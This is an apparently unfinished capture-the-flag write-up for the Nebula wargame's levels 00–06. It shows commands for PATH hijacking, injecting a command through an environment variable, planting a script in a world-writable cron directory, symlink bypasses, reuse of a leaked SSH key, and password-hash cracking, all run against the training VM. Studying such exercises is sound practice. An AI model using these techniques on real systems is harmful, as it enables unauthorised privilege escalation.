# The Writeup for Nebula Level

## Introduction

This writeup is for Nebula level in [exploit-exercises.com] (https://exploit-exercises.com/nebula/).
Users can download a virtual disk file and setup a virtual machine to do exercises. The login user/password pair is nebula/nebula, which also contains the sudo permission. Regarding each level, users can apply levelXX/levelXX user/password pair to challenge each level.

Regarding the emulated screen is not friendly. We can setup ssh and login remotely. However, please generate RSA and DSA key pair firstly.

```
ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key
ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key
service ssh restart
```   

Then ssh from your local terminal. The IP address depends on your Network configuration of Virtual Box. I chose NAT mode and set port forward.

```
ssh -p 1222 nebula@127.0.0.1
```

## Writeup

### Level00

Firstly, please login as level00 with the password of level00.

The mission is to find a Set User ID program that will run as the “flag00” account.

After check the manual of `find` command, the command is followed.
 
```
find / -perm -4000 -user flag00 > result.log
cat result.log
```

The aim program is `/rofs/bin/.../flag00` and the output is that `Congrats, now run getflag to get your flag!`

The fullpath of the flag program is `/bin/getflag`.

### Level01
The vulnerability of this level is about PATH variable in the environment. We can set current directory as PATH by command `env PATH=.`, then link `echo` to flag program.

The following shell script shows the exploit process.

```
ln -s /bin/getflag echo
env PATH=. /home/flag01/flag01
```

### Level02
The vulnerability of level02 is about shell command injection.

The following shell script will load flag program.

```
ln -s /bin/getflag x
env PATH=. USER='hacked; ./x' /home/flag02/flag02
```

### Level03
The vulnerability is about a writable crontab directory. The permission of `writable.d` is `0777`, which means any one is able to add a file in this directory. As any scripts in this directory will be executed by writable.sh, I just put a script to load flag program.

The content of the script is followed.

```
#!/bin/sh
/bin/getflag > /tmp/level03.log
``` 

After a short time (5 minutes), the script will be executed and the log file can be found.

### Level04
It is not a good practice that restricting access file based on filename, because soft link can be used to bypass such control.

```
ln -s /home/flag04/token x
/home/flag04/flag04 x
```

The output is `06508b5e-8909-4f38-b630-fdb148a848a2` .

### Level05
In the home of user level05, `.backup` directory can be read by others. `backup-19072011.tgz` is stored in this directory. I decompressed it and found private key for ssh.

The following ssh command will be used to login without password.

```
ssh -i ./id_rsa flag05@localhost
```

### Level06
The password of user `flag06` is followed UNIX style. The hash value is stored in `/etc/password`.

`flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh`

The hash can be cracked by John the Ripper on Kali.

save user:hash into a file named test_pass.txt and apply this command to crack.

`john test_pass.txt `

The output shows the password is `hello`

```
root@kali:/tmp# john test_pass.txt 
Loaded 1 password hash (Traditional DES [128/128 BS SSE2-16])
hello            (flag06)
guesses: 1  time: 0:00:00:00 DONE (Mon Dec 21 12:18:25 2015)  c/s: 74200  trying: 123456 - thebest3
Use the "--show" option to display all of the cracked passwords reliably
```

### Level07
TBC 

## Conclusion

## Reference
